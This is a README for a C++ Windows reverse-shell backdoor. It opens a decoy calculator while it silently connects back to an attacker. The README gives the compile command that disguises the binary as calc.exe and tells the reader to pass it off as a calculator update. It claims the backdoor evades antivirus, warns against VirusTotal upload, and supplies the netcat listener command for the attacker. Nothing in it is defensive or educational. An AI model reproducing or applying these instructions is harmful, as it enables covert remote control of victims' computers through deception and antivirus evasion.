# Reverseshellcpp
A FUD Backdoor Reverse Shell coded in CPP for any Windows distribution, that will fire a decoy app in the foreground while connecting back to the attacker machine as a silent background process.

Change the IP to the attacker machine's IP and the port number to your desired port number and compile using:
i686-w64-mingw32-g++ reverse.cpp -o calc.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

Pass it to the attacker , stating that this is a updated version of calc.exe.
You can scan the application with your AV solutions , if you want , and I am pretty sure thant 98% of the AV solutions will NOT detect it.
It has passed the check of Windows Defender with an updated definition file.

PLEASE DO NOT UPLOAD TO VIRUSTOTAL !!!

Start a netcat listener on port 8080 using nc -lvp 8080

Once the victim executes the app, the decoy process (calc.exe) will fire up in the foregroud , while a reverse shell will fire up in the background, giving you a DOS prompt.

Type in POWERSHELL on the DOS prompt to leverage the post exploitation module.

Cheers

#Captain_Nemo

